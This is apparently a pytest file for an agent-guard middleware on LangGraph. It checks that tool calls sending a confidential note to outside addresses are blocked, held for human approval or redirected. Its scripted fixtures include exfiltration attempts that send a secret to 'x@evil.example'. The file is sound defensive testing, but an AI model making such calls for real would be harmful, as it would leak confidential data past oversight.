"""LangGraph adapter tests (run where `langgraph` and `langchain` are installed; skipped otherwise).

Scenario S36: the same calls, guarded by the adapter and guarded by hand-wrapped functions, must
give the same decisions and the same audit content.
"""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

import pytest

pytest.importorskip("langgraph")
pytest.importorskip("langchain")

from langchain.agents import create_agent  # noqa: E402
from langchain_core.language_models.chat_models import BaseChatModel  # noqa: E402
from langchain_core.messages import AIMessage, ToolMessage  # noqa: E402
from langchain_core.outputs import ChatGeneration, ChatResult  # noqa: E402
from langchain_core.tools import tool  # noqa: E402
from langgraph.checkpoint.memory import InMemorySaver  # noqa: E402
from langgraph.types import Command  # noqa: E402

from agentguard.adapters.langgraph import (  # noqa: E402
    build_lock,
    decision_from_resume,
    definitions_of,
    guard_middleware,
)
from agentguard.core.approval import ApprovalStore  # noqa: E402
from agentguard.core.audit import AuditLog, read_entries  # noqa: E402
from agentguard.core.lock import Egress  # noqa: E402
from agentguard.core.policy import parse_config  # noqa: E402
from agentguard.sdk import Approved, CallBlocked, Denied, Guard, Modified  # noqa: E402

SECRET = (
    "Project Falcon launch budget is 4.2M USD. Board vote scheduled for March 3rd. "
    "Codename ORCHID-7731 must not leak outside the company."
)
CONFIG = """
flow:
  destinations: {corp_mail: ["*@corp.example"]}
  rules:
    - id: FL-001
      from: [confidential]
      to: {kind: [message]}
      allow_destinations: [corp_mail]
      on_value_match: deny
      on_session_exposure: require_approval
"""
DECLARATIONS = {
    "read_note": {"produces": ["confidential"]},
    "send_report": {
        "egress": Egress(kind="message", destination_args=["to"], payload_args=["body"]).model_dump()
    },
}


class ScriptedModel(BaseChatModel):
    """A chat model that replays prepared messages, so no LLM and no network are involved."""

    script: list[AIMessage]
    position: int = 0

    @property
    def _llm_type(self) -> str:
        return "scripted"

    def bind_tools(self, tools: Any, **kwargs: Any) -> ScriptedModel:
        return self

    def _generate(
        self, messages: Any, stop: Any = None, run_manager: Any = None, **kwargs: Any
    ) -> ChatResult:
        message = (
            self.script[self.position] if self.position < len(self.script) else AIMessage(content="done")
        )
        self.position += 1
        return ChatResult(generations=[ChatGeneration(message=message)])


def make_tools(sent: list[tuple[str, str]]) -> list[Any]:
    @tool
    def read_note() -> str:
        """Read the confidential note."""
        return SECRET

    @tool
    def send_report(to: str, body: str) -> str:
        """Send a report."""
        sent.append((to, body))
        return "sent"

    return [read_note, send_report]


def make_guard(tmp_path: Path, tools: list[Any]) -> Guard:
    config = parse_config(CONFIG, base_dir=tmp_path)
    declarations = {name: d for name, d in DECLARATIONS.items() if name in {t.name for t in tools}}
    return Guard(
        config=config,
        lock=build_lock(tools, declarations),
        audit=AuditLog(tmp_path / "audit.jsonl"),
        approvals=ApprovalStore(tmp_path / "approvals", 300),
    )


def calls(*steps: tuple[str, dict[str, Any]]) -> list[AIMessage]:
    return [
        AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": f"call_{number}"}])
        for number, (name, args) in enumerate(steps)
    ]


SCENARIO = (
    ("read_note", {}),
    ("send_report", {"to": "x@evil.example", "body": SECRET}),  # value match: denied
    ("send_report", {"to": "alice@corp.example", "body": SECRET}),  # allowlisted: allowed
    ("send_report", {"to": "x@evil.example", "body": "all good"}),  # needs a human: approved
)


def build_agent(tmp_path: Path, steps: Any, **middleware_args: Any):  # type: ignore[no-untyped-def]
    sent: list[tuple[str, str]] = []
    tools = make_tools(sent)
    guard = make_guard(tmp_path, tools)
    agent = create_agent(
        ScriptedModel(script=calls(*steps)),
        tools,
        middleware=[guard_middleware(guard, **middleware_args)],
        checkpointer=InMemorySaver(),
    )
    return agent, guard, sent


def thread(name: str = "t1") -> dict[str, Any]:
    return {"configurable": {"thread_id": name}}


def tool_messages(result: dict[str, Any]) -> list[ToolMessage]:
    return [message for message in result["messages"] if isinstance(message, ToolMessage)]


def outcome_of(message: ToolMessage) -> str:
    match = re.search(r"\((AG_[A-Z_]+)\)", str(message.content))
    return f"blocked:{match.group(1)}" if message.status == "error" and match else message.status or "?"


def audit_content(tmp_path: Path) -> set[tuple[Any, ...]]:
    """What the audit log says, without ids, times and hashes; repeats collapsed."""
    keep = (
        "event",
        "tool",
        "decision",
        "reason_code",
        "rule_ids",
        "outcome",
        "decided_by",
        "args",
        "evidence",
    )
    content = set()
    for entry in read_entries(tmp_path / "audit.jsonl"):
        if entry["event"] in ("call.decided", "approval.requested", "approval.decided", "call.result"):
            content.add(tuple((key, repr(entry.get(key))) for key in keep))
    return content


# --- the adapter ---------------------------------------------------------------------------------


def test_blocked_call_becomes_an_error_message_and_the_tool_does_not_run(tmp_path: Path) -> None:
    agent, _, sent = build_agent(tmp_path, SCENARIO[:2])
    result = agent.invoke({"messages": [("user", "go")]}, thread())
    outcomes = [outcome_of(message) for message in tool_messages(result)]
    assert outcomes == ["success", "blocked:AG_FLOW_VALUE_MATCH"]
    assert sent == []


def test_approval_pauses_the_graph_and_resumes_with_the_answer(tmp_path: Path) -> None:
    agent, guard, sent = build_agent(tmp_path, SCENARIO[:1] + SCENARIO[3:])
    paused = agent.invoke({"messages": [("user", "go")]}, thread())
    interrupts = paused["__interrupt__"]
    assert interrupts[0].value["agentguard"] == "approval_required"
    assert interrupts[0].value["tool"] == "local__send_report"
    assert sent == []  # nothing ran while waiting

    result = agent.invoke(Command(resume={"decision": "approve", "decided_by": "alice"}), thread())
    assert sent == [("x@evil.example", "all good")]
    assert [outcome_of(m) for m in tool_messages(result)] == ["success", "success"]
    decided = [e for e in read_entries(guard.audit.path) if e["event"] == "approval.decided"]
    assert [(e["outcome"], e["decided_by"]) for e in decided] == [("approved", "alice")]


def test_denial_and_unknown_answers_block_the_call(tmp_path: Path) -> None:
    for number, answer in enumerate(("deny", False, {"decision": "maybe"}, "perhaps")):
        agent, _, sent = build_agent(tmp_path / f"case{number}", SCENARIO[:1] + SCENARIO[3:])
        agent.invoke({"messages": [("user", "go")]}, thread())
        result = agent.invoke(Command(resume=answer), thread())
        assert outcome_of(tool_messages(result)[-1]) == "blocked:AG_APPROVAL_DENIED" and sent == []


def test_a_modified_decision_changes_the_arguments_and_is_checked_again(tmp_path: Path) -> None:
    agent, _, sent = build_agent(tmp_path, SCENARIO[:1] + SCENARIO[3:])
    agent.invoke({"messages": [("user", "go")]}, thread())
    agent.invoke(Command(resume={"decision": "modify", "args": {"to": "bob@corp.example"}}), thread())
    assert sent == [("bob@corp.example", "all good")]  # the reviewer redirected it to an allowlisted address


def test_tool_missing_from_the_lockfile_never_runs(tmp_path: Path) -> None:
    sent: list[tuple[str, str]] = []
    tools = make_tools(sent)
    guard = make_guard(tmp_path, tools[:1])  # send_report was never approved
    agent = create_agent(
        ScriptedModel(script=calls(("send_report", {"to": "alice@corp.example", "body": "hi"}))),
        tools,
        middleware=[guard_middleware(guard)],
        checkpointer=InMemorySaver(),
    )
    result = agent.invoke({"messages": [("user", "go")]}, thread())
    assert outcome_of(tool_messages(result)[0]) == "blocked:AG_TOOL_UNAPPROVED" and sent == []


def test_default_flow_without_a_handler_tells_the_agent_to_ask_a_person(tmp_path: Path) -> None:
    agent, _, sent = build_agent(tmp_path, SCENARIO[:1] + SCENARIO[3:], on_approval=None)
    result = agent.invoke({"messages": [("user", "go")]}, thread())
    assert "agentguard approve ap_" in str(tool_messages(result)[-1].content) and sent == []
    assert "__interrupt__" not in result


def test_the_thread_id_is_the_run_id(tmp_path: Path) -> None:
    agent, _, sent = build_agent(tmp_path, SCENARIO[:1] + SCENARIO[3:], on_approval=None)
    agent.invoke({"messages": [("user", "go")]}, thread("reader"))  # reads, then is held for approval
    other = ScriptedModel(script=calls(SCENARIO[3]))  # a different thread never read the note
    sent2: list[tuple[str, str]] = []
    guard2 = make_guard(tmp_path / "second", make_tools(sent2))
    agent2 = create_agent(
        other,
        make_tools(sent2),
        middleware=[guard_middleware(guard2, on_approval=None)],
        checkpointer=InMemorySaver(),
    )
    result = agent2.invoke({"messages": [("user", "go")]}, thread("fresh"))
    assert outcome_of(tool_messages(result)[0]) == "success" and sent2 == [("x@evil.example", "all good")]
    assert sent == []


async def test_async_agent_goes_through_the_guard_too(tmp_path: Path) -> None:
    agent, _, sent = build_agent(tmp_path, SCENARIO[:3])
    result = await agent.ainvoke({"messages": [("user", "go")]}, thread())
    assert [outcome_of(m) for m in tool_messages(result)] == [
        "success",
        "blocked:AG_FLOW_VALUE_MATCH",
        "success",
    ]
    assert sent == [("alice@corp.example", SECRET)]


def test_resume_answers_are_parsed_strictly() -> None:
    assert decision_from_resume("approve") == Approved(decided_by="interrupt")
    assert decision_from_resume(True) == Approved(decided_by="interrupt")
    assert decision_from_resume({"decision": "approve", "decided_by": "bob"}) == Approved(decided_by="bob")
    assert decision_from_resume({"decision": "modify", "args": {"to": "a"}}) == Modified(
        {"to": "a"}, decided_by="interrupt"
    )
    for junk in (None, 0, "", "maybe", {"decision": "modify"}, {"decision": "modify", "args": "x"}, [True]):
        assert isinstance(decision_from_resume(junk), Denied)


# --- S36: adapter and hand-wrapped functions agree ----------------------------------------------------


def manual_guard(tmp_path: Path, plain: dict[str, Any]) -> Guard:
    """A guard whose lockfile holds the definitions of the plain Python functions."""
    from agentguard.core.lock import LockFile, ToolLabels, approve, update_lock
    from agentguard.sdk import tool_definition

    lock = update_lock(LockFile(), {"local": [tool_definition(fn, name) for name, fn in plain.items()]}, {})
    for name, declared in DECLARATIONS.items():
        locked = lock.servers["local"].tools[name]
        locked.labels = ToolLabels(produces=declared.get("produces", []))
        locked.egress = Egress.model_validate(declared["egress"]) if declared.get("egress") else None
    approve(lock)
    return Guard(
        config=parse_config(CONFIG, base_dir=tmp_path),
        lock=lock,
        audit=AuditLog(tmp_path / "audit.jsonl"),
        approvals=ApprovalStore(tmp_path / "approvals", 300),
    )


def run_by_hand(tmp_path: Path) -> tuple[list[str], list[tuple[str, str]]]:
    sent: list[tuple[str, str]] = []
    plain = {t.name: t.func for t in make_tools(sent)}
    guard = manual_guard(tmp_path, plain)
    wrapped = {name: guard.wrap(fn, name) for name, fn in plain.items()}
    outcomes = []
    with guard.task(run_id="t1", on_approval=lambda request: Approved(decided_by="alice")):
        for name, args in SCENARIO:
            try:
                wrapped[name](**args)
                outcomes.append("success")
            except CallBlocked as blocked:
                outcomes.append(f"blocked:{blocked.reason_code}")
    return outcomes, sent


def test_s36_adapter_and_manual_wrapping_agree(tmp_path: Path) -> None:
    agent, _, sent_adapter = build_agent(tmp_path / "adapter", SCENARIO)
    result = agent.invoke({"messages": [("user", "go")]}, thread())
    result = agent.invoke(Command(resume={"decision": "approve", "decided_by": "alice"}), thread())
    adapter_outcomes = [outcome_of(m) for m in tool_messages(result)]

    manual_outcomes, sent_manual = run_by_hand(tmp_path / "manual")

    assert (
        adapter_outcomes
        == manual_outcomes
        == ["success", "blocked:AG_FLOW_VALUE_MATCH", "success", "success"]
    )
    assert sent_adapter == sent_manual
    assert audit_content(tmp_path / "adapter") == audit_content(tmp_path / "manual")


# --- lockfile support ----------------------------------------------------------------------------------


def test_definitions_of_feeds_lock_from_python(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from typer.testing import CliRunner

    from agentguard.cli import app
    from agentguard.core.lock import load_lock

    (tmp_path / "my_agent_tools.py").write_text(
        "from langchain_core.tools import tool\n"
        "@tool\n"
        "def lookup(query: str) -> str:\n"
        '    """Look something up."""\n'
        "    return query\n"
        "from agentguard.adapters.langgraph import definitions_of\n"
        "TOOL_DEFINITIONS = definitions_of([lookup])\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    (tmp_path / "agentguard.yaml").write_text("version: 1\n", encoding="utf-8")
    runner = CliRunner()
    args = ["--config", str(tmp_path / "agentguard.yaml"), "--from-python", "my_agent_tools:TOOL_DEFINITIONS"]
    assert runner.invoke(app, ["lock", *args]).exit_code == 0
    assert runner.invoke(app, ["lock", "approve", *args]).exit_code == 0
    assert runner.invoke(app, ["lock", "--check", *args]).exit_code == 0
    assert set(load_lock(tmp_path / "agentguard.lock").servers["local"].tools) == {"lookup"}
    assert definitions_of(make_tools([]))[0]["name"] == "read_note"


# --- unknown tools and parallel calls -----------------------------------------------------------------


def test_a_call_for_an_unregistered_tool_is_refused_before_inner_middleware_can_serve_it(
    tmp_path: Path,
) -> None:
    from langchain.agents.middleware import AgentMiddleware

    reached: list[str] = []

    class ServesAnything(AgentMiddleware):  # type: ignore[type-arg]
        """Answers requests for tools the agent does not have, without validation."""

        def wrap_tool_call(self, request: Any, handler: Any) -> Any:
            if request.tool is None:
                reached.append(request.tool_call["name"])
                return ToolMessage(
                    content="served unchecked",
                    name=request.tool_call["name"],
                    tool_call_id=request.tool_call["id"],
                )
            return handler(request)

    sent: list[tuple[str, str]] = []
    tools = make_tools(sent)
    guard = make_guard(tmp_path, tools)
    agent = create_agent(
        ScriptedModel(script=calls(("ghost_tool", {"x": 1}))),
        tools,
        middleware=[guard_middleware(guard), ServesAnything()],  # the guard is outermost
        checkpointer=InMemorySaver(),
    )
    result = agent.invoke({"messages": [("user", "go")]}, thread())
    assert outcome_of(tool_messages(result)[0]) == "blocked:AG_TOOL_UNAPPROVED"
    assert reached == []


def two_calls_in_one_message() -> list[AIMessage]:
    read = AIMessage(content="", tool_calls=[{"name": "read_note", "args": {}, "id": "r0"}])
    both = AIMessage(
        content="",
        tool_calls=[
            {"name": "send_report", "args": {"to": "a@evil.example", "body": "one"}, "id": "p1"},
            {"name": "send_report", "args": {"to": "b@evil.example", "body": "two"}, "id": "p2"},
        ],
    )
    return [read, both]


def test_parallel_calls_that_both_need_approval_never_run_without_it(tmp_path: Path) -> None:
    sent: list[tuple[str, str]] = []
    tools = make_tools(sent)
    guard = make_guard(tmp_path, tools)
    agent = create_agent(
        ScriptedModel(script=two_calls_in_one_message()),
        tools,
        middleware=[guard_middleware(guard)],
        checkpointer=InMemorySaver(),
    )
    paused = agent.invoke({"messages": [("user", "go")]}, thread())
    pending = paused["__interrupt__"]
    assert len(pending) == 2 and sent == []  # both calls wait; nothing ran

    # LangGraph refuses a bare answer when several interrupts are open: the answer must name one.
    with pytest.raises(RuntimeError, match="multiple pending interrupts"):
        agent.invoke(Command(resume="approve"), thread())
    assert sent == []

    answers = {pending[0].id: "approve", pending[1].id: "deny"}
    agent.invoke(Command(resume=answers), thread())
    assert len(sent) == 1  # only the approved call ran


async def test_parallel_calls_with_grants_in_the_async_path(tmp_path: Path) -> None:
    sent: list[tuple[str, str]] = []
    tools = make_tools(sent)
    guard = make_guard(tmp_path, tools)
    agent = create_agent(
        ScriptedModel(script=two_calls_in_one_message()),
        tools,
        middleware=[guard_middleware(guard, on_approval=None)],
        checkpointer=InMemorySaver(),
    )
    result = await agent.ainvoke({"messages": [("user", "go")]}, thread())
    outcomes = [m.content for m in tool_messages(result)[1:]]
    assert len(outcomes) == 2 and all("agentguard approve ap_" in str(text) for text in outcomes)
    assert sent == []
